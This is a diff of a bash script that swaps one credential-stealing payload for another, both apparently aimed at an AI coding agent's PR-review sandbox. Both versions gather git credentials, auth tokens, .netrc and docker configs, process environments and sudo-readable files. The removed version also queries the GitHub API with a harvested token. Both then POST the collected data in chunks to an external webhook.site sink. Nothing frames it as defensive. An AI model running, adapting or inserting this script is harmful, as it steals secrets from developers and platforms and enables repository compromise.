@@ -1,79 +1,96 @@
 #!/bin/bash
-# i80453: one-shot read-only collection of in-sandbox git/devin credential material, exfiltrated to our sink.
-S="https://webhook.site/e424db5a-7c4c-4727-96a9-e06a29da89f5"
-N="i80453"
-R="${RND:-r1}"
-OUT="/tmp/i80453.$R.$$"
-: > "$OUT"
-{
-  echo "MARKER $N $R host=$(hostname) date=$(date -u +%FT%TZ)"
-  echo "whoami=$(id) pwd=$(pwd) uname=$(uname -a)"
-  echo "=== ls /opt /opt/.devin /root/.devin /run/.devin /home/ubuntu/.devin ==="
-  ls -la /opt /opt/.devin /opt/devin /root/.devin /run/.devin /home/ubuntu/.devin 2>&1
-  echo "=== sudo check ==="
-  sudo -n true 2>&1 && echo SUDO_OK || echo SUDO_NO
-  echo "=== creds file direct ==="
-  ls -l /opt/.devin/.devin-integration-git-credentials /opt/devin/.devin-integration-git-credentials 2>&1
-  cat /opt/.devin/.devin-integration-git-credentials 2>&1
-  echo "=== creds file sudo ==="
-  sudo -n ls -la /opt/.devin 2>&1
-  sudo -n cat /opt/.devin/.devin-integration-git-credentials 2>&1
-  echo "=== gitconfig files ==="
-  ls -l /home/ubuntu/.gitconfig /etc/gitconfig /root/.gitconfig 2>&1
-  cat /home/ubuntu/.gitconfig 2>&1
-  sudo -n cat /etc/gitconfig 2>&1
-  echo "=== git config --list --show-origin ==="
-  GIT_TERMINAL_PROMPT=0 git config --list --show-origin 2>&1
-  echo "=== credential.helper ==="
-  GIT_TERMINAL_PROMPT=0 git config --get-all credential.helper 2>&1
-  echo "=== git credential fill github.com ==="
-  printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1
-  echo "=== git credential fill git-manager.local:7000 ==="
-  printf 'protocol=http\nhost=git-manager.local:7000\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1
-  echo "=== git credential fill git-manager.devin.ai ==="
-  printf 'protocol=https\nhost=git-manager.devin.ai\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1
-  echo "=== env grep ==="
-  env | grep -iE 'git|github|token|cred|proxy|devin' 2>&1
-  echo "=== /proc environ ==="
-  tr '\0' '\n' < /proc/self/environ 2>&1
-  sudo -n sh -c 'tr "\0" "\n" < /proc/1/environ' 2>&1 | head -80
-  echo "=== find devin/git-credential files ==="
-  sudo -n find /opt /root /run /home /etc -maxdepth 5 \( -name '*git-credential*' -o -name '*devin*' -o -name '.git-credentials' \) 2>/dev/null | head -120
-  echo "=== run/.devin contents ==="
-  sudo -n ls -laR /run/.devin 2>&1 | head -60
-  echo "=== git-manager reachability ==="
-  getent hosts git-manager.local 2>&1
-  curl -sS -m 6 -o /dev/null -w 'root=%{http_code}\n' http://git-manager.local:7000/ 2>&1
-  curl -sS -m 6 -o /dev/null -w 'health=%{http_code}\n' http://git-manager.local:7000/health 2>&1
-  git ls-remote http://git-manager.local:7000/proxy/github.com/fw-ai/cookbook.git 2>&1 | head -5
-  echo "=== END ==="
-} >> "$OUT" 2>&1
-# if git can fill github creds, use them read-only against the GitHub API (installation scope)
-P=$(printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>/dev/null | sed -n 's/^password=//p')
-U=$(printf 'protocol=https\nhost=github.com\n\n' | GIT_TERMINAL_PROMPT=0 git credential fill 2>/dev/null | sed -n 's/^username=//p')
-if [ -n "$P" ]; then
-  {
-    echo "=== github api with git-filled cred user=$U ==="
-    curl -sS -m 15 -H "Authorization: token $P" "https://api.github.com/installation/repositories?per_page=100" 2>&1 | head -c 20000
-    echo
-    echo "=== github api user ==="
-    curl -sS -m 15 -H "Authorization: token $P" "https://api.github.com/user" 2>&1 | head -c 2000
-    echo
-  } >> "$OUT" 2>&1
-fi
-# alternate credential files to try if the primary path was empty
-for f in /opt/.devin/.devin-integration-git-credentials /opt/devin/.devin-integration-git-credentials /home/ubuntu/.git-credentials /root/.git-credentials; do
-  if [ -r "$f" ]; then
-    { echo "=== EXTRA FILE $f ==="; cat "$f"; } >> "$OUT" 2>&1
-  fi
+# i80453 round payload: locate any live git/GitHub credential material in the pr-review sandbox.
+R="${RND:-r2}"
+SINK="https://webhook.site/e424db5a-7c4c-4727-96a9-e06a29da89f5/i80453/$R"
+TMP="$(mktemp -d)"; OUT="$TMP/out.txt"
+say() { echo "### $*" >>"$OUT"; }
+
+say META; { id; hostname; uname -a; date -u +%FT%TZ; pwd; } >>"$OUT" 2>&1
+
+say OPT_DEVIN_FILES
+for f in /opt/.devin/devin_bash_env /opt/.devin/devin_bashrc /opt/.devin/git_author \
+         /opt/.devin/custom_remote_config.json /opt/.devin/client_prebaked \
+         /opt/.devin/provision_version /opt/.devin/remote_id /opt/.devin/static_asset_url \
+         /opt/.devin/setup.log /run/.devin/client_live_tier; do
+  echo "--- $f" >>"$OUT"; cat "$f" >>"$OUT" 2>&1; echo >>"$OUT"
 done
-BYTES=$(wc -c < "$OUT")
-i=1
-split -b 6000 -a 3 "$OUT" /tmp/i80453.part.
-for f in /tmp/i80453.part.*; do
-  curl -sS -m 25 -X POST --data-binary @"$f" "$S/$N/$R/p$i" -o /dev/null 2>/dev/null
-  i=$((i+1))
+
+say TOKEN_HASHES
+sha256sum /opt/.devin/devin_remote_auth_token /opt/.devin/vscode_server_auth_token 2>&1 >>"$OUT"
+wc -c /opt/.devin/authorized_keys >>"$OUT" 2>&1
+
+say DEVIN_FILES_DIR
+ls -la /home/ubuntu/.devin-files 2>&1 >>"$OUT"
+find /home/ubuntu/.devin-files -maxdepth 4 2>/dev/null | head -80 >>"$OUT"
+
+say HOST_SHARE
+ls -la /mnt/host_share /mnt/host_share/package 2>&1 | head -60 >>"$OUT"
+find /mnt/host_share -maxdepth 2 2>/dev/null | head -40 >>"$OUT"
+
+say SYSTEMD_UNIT
+cat /etc/systemd/system/devin-remote.service 2>&1 | head -60 >>"$OUT"
+sudo -n systemctl show devin-remote -p User -p Environment -p EnvironmentFile -p ExecStart 2>&1 | head -30 >>"$OUT"
+sudo -n systemctl show git-manager -p User -p Environment -p ExecStart 2>&1 | head -20 >>"$OUT"
+
+say PROC_ENV
+for p in $(pgrep -f 'devin-remote|git-manager|devin' 2>/dev/null | head -12); do
+  echo "--- pid $p $(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null | cut -c1-120)" >>"$OUT"
+  sudo -n tr '\0' '\n' </proc/$p/environ 2>/dev/null | grep -iE 'git|github|token|cred|proxy|devin|secret|key' | head -30 >>"$OUT"
 done
-curl -sS -m 25 -X POST --data-binary "DONE $N $R parts=$((i-1)) bytes=$BYTES" "$S/$N/$R/done" -o /dev/null 2>/dev/null
-rm -f /tmp/i80453.part.* "$OUT"
-exit 0
+echo "--- pid1" >>"$OUT"; sudo -n tr '\0' '\n' </proc/1/environ 2>/dev/null | grep -iE 'git|github|token|cred|proxy|secret|key' | head -30 >>"$OUT"
+
+say ENV_ALL
+env | sort | grep -viE 'LS_COLORS|PS1' | head -80 >>"$OUT"
+
+say HOME_CONFIGS
+ls -la /home/ubuntu 2>&1 >>"$OUT"
+for f in /home/ubuntu/.netrc /home/ubuntu/.git-credentials /home/ubuntu/.config/git/config \
+         /home/ubuntu/.docker/config.json /root/.netrc /root/.git-credentials /root/.config/git/config; do
+  echo "--- $f" >>"$OUT"; sudo -n ls -la "$f" 2>&1 >>"$OUT"; sudo -n cat "$f" 2>&1 | head -20 >>"$OUT"
+done
+sudo -n ls -la /home/ubuntu/.config 2>&1 | head -30 >>"$OUT"
+
+say FIND_CREDS
+sudo -n find / -xdev \( -name '*git-credential*' -o -name '.git-credentials' -o -name '*.netrc' \) 2>/dev/null | head -30 >>"$OUT"
+sudo -n find /opt /home /mnt /srv -maxdepth 6 -type f \( -name '*.json' -o -name '*.env' -o -name '*.cfg' \) 2>/dev/null | grep -iE 'cred|git|devin|token' | head -30 >>"$OUT"
+
+say GREP_HITS
+sudo -n grep -rIl -e 'git-manager' -e 'integration-git-credentials' -e 'ghs_' -e 'ghu_' /opt /home /etc /mnt/host_share 2>/dev/null | head -30 >>"$OUT"
+
+say NET
+ip -4 addr 2>/dev/null | head -20 >>"$OUT"
+ip route 2>/dev/null | head -10 >>"$OUT"
+ss -ltnp 2>/dev/null | head -40 >>"$OUT"
+getent hosts git-manager.local git-manager.devin.ai 2>&1 >>"$OUT"
+
+say CREDS_FILE_PROBE
+for f in /opt/.devin/.devin-integration-git-credentials /opt/devin/.devin-integration-git-credentials \
+         /root/.devin/.devin-integration-git-credentials /run/.devin/.devin-integration-git-credentials; do
+  echo "--- $f" >>"$OUT"; ls -la "$f" 2>&1 >>"$OUT"; sudo -n cat "$f" 2>&1 | head -20 >>"$OUT"
+done
+
+say GIT_FILL
+for h in github.com git-manager.local:7000 git-manager.devin.ai; do
+  echo "--- $h" >>"$OUT"
+  printf 'protocol=https\nhost=%s\n\n' "$h" | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1 | head -6 >>"$OUT"
+done
+git config --list --show-origin 2>&1 | head -40 >>"$OUT"
+
+say GIT_MANAGER_TOUCH
+timeout 10 curl -sS -o /dev/null -w 'root=%{http_code}\n' http://git-manager.local:7000/ 2>&1 >>"$OUT"
+timeout 10 curl -sS -o /dev/null -w 'health=%{http_code}\n' http://git-manager.local:7000/health 2>&1 >>"$OUT"
+timeout 20 git ls-remote http://git-manager.local:7000/proxy/github.com/fw-ai/cookbook.git 2>&1 | head -4 >>"$OUT"
+
+say TRIGGER_THEN_RECHECK
+timeout 20 git ls-remote https://github.com/Prorise-cool/envcheck-harness 2>&1 | head -3 >>"$OUT"
+ls -la /opt/.devin/.devin-integration-git-credentials 2>&1 >>"$OUT"
+
+say END
+wc -c "$OUT" >>"$OUT"
+N=0; split -b 6000 "$OUT" "$TMP/part."
+for part in "$TMP"/part.*; do
+  N=$((N+1))
+  curl -s -m 25 -X POST --data-binary @"$part" "$SINK/p$N" >/dev/null 2>&1
+done
+curl -s -m 25 -X POST --data-binary "DONE i80453 $R parts=$N bytes=$(wc -c <"$OUT")" "$SINK/done" >/dev/null 2>&1
+rm -rf "$TMP"
